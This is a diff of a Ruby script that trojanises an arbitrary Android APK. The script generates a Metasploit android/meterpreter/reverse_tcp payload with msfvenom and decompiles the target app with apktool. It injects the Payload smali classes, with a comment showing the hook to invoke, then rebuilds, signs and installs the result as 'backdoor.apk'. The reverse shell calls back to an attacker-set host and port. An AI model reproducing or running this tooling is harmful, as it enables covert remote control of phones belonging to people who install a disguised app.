@@ -14,17 +14,19 @@ unless(apktool && apktool.length > 0)
     exit(1)
 end
 
-`./msfvenom -f raw -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=5556 > android.apk`
+`./msfvenom -f raw -p android/meterpreter/reverse_tcp LHOST=192.168.1.73 LPORT=5556 > android.apk`
 
 `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android android.apk androiddebugkey`
 
-`rm -rf baidu`
+`rm -rf original`
 `rm -rf android`
 
-`apktool d #{apkfile}`
+`cp #{apkfile} original.apk`
+
+`apktool d original.apk`
 `apktool d android.apk`
 
-f = File.open("baidu/AndroidManifest.xml")
+f = File.open("original/AndroidManifest.xml")
 amanifest = Nokogiri::XML(f)
 f.close
 
@@ -48,7 +50,12 @@ launcheractivity = findlauncheractivity(amanifest)
 
 puts launcheractivity
 
-print 'mkdir -p baidu/smali/com/metasploit/stage/' + "\n"
-print 'cp android/smali/com/metasploit/stage/Payload.smali baidu/smali/com/metasploit/stage/' + "\n"
-print 'apktool b -o baiduout.apk baidu ' + "\n"
+print 'mkdir -p original/smali/com/metasploit/stage/' + "\n"
+print 'cp android/smali/com/metasploit/stage/Payload* original/smali/com/metasploit/stage/' + "\n"
+print "\n" # modify the smali here: 
+# invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
+print 'apktool b -o backdoor.apk original ' + "\n"
+print 'jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android backdoor.apk androiddebugkey ' + "\n"
+print 'adb install backdoor.apk' + "\n"
+
 
